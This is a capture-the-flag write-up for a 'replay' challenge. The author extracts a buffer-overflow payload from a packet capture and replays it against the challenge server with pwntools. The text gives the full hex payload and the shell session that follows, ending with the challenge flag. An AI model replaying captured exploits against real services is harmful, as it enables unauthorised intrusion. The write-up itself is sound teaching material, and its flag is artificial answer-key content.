# replay

**Category**: Misc \
**Points**: 30 (184 solves) \
**Author**: qxxxb

## Challenge

Somebody pwned my app! Luckily I managed to capture the network traffic of their exploit. Oh by the way, the same app is also running on ```misc.chall.pwnoh.io``` on port ```13371```. Can you pwn it for me?

Attachments: ```replay.pcap```

Difficulty: Easy

## Overview

We have a .pcap file with the TCP stream and a program running on the challenge server. The payload of a packet looks like a overflow exploit, so we can try to export the data and replay it.

## Solution

First of all, we can try to connect to the server and see what is going on.

```bash
nc misc.chall.pwnoh.io 13371
```

```bash
bipe@ava40l:~$  nc misc.chall.pwnoh.io 13371
HELLO HOW ARE YOU DOING TODAY
```

The app returns ```HELLO HOW ARE YOU DOING TODAY``` and nothing more.


Opening the .pcap file with Wireshark and doing a quick analysis, we can see the packet with the same data that the server just sent us:

![pcap1.png](pcap1.png)


Right click on it, Follow -> TCP Stream gives us a very clear understanding of what happened. The connection with the server was made, the server sent it's data to the attacker, then the attacker sent his exploit and took control.

![tcpstream.png](tcpstream.png)


Sending the same payload via netcat won't work, the connection will close. So we can use pwntools connection (```pwnlib.tubes```). Before, let's export the exploit bytes (just copy or export the RAW data):

![exporting.png](exporting.png)


Instead of creating a python script to send the exploit and run the scripted commands, I used the interactive python console for the legit pwn feeling.

Import pwn, create a connection with the victim, store the hex stream of the payload in a variable and send it using ```bytes.fromhex(variable)```:

attack.png
```python
bipe@ava40l:~$ python3
Python 3.8.10 (default, Sep 28 2021, 16:10:42) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> conn = remote('misc.chall.pwnoh.io', 13371)
[x] Opening connection to misc.chall.pwnoh.io on port 13371
[x] Opening connection to misc.chall.pwnoh.io on port 13371: Trying 3.19.161.60
[+] Opening connection to misc.chall.pwnoh.io on port 13371: Done
>>> payload = '6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161796161617a616162626161626361616264616162656161626661616267616162686161626961616255114000000000000f0000000000000057114000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000042040000000000000000000000000000000000000000000000000000000000000000000000000003b000000000000000000000000000000000000000000000057114000000000000000000000000000330000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a'
>>> conn.sendline(bytes.fromhex(payload))
>>> conn.interactive()
[*] Switching to interactive mode
HELLO HOW ARE YOU DOING TODAY
id
uid=1000 gid=1000 groups=1000
ls
chall
flag.txt
cat flag.txt
buckeye{g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry}
exit
[*] Got EOF while reading in interactive
```

Note that is necessary to call ```conn.interactive()``` after sending the payload to interact with the open connection. Then, we are able to run commands and retrieve the flag.

FLAG: 

```buckeye{g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry}```
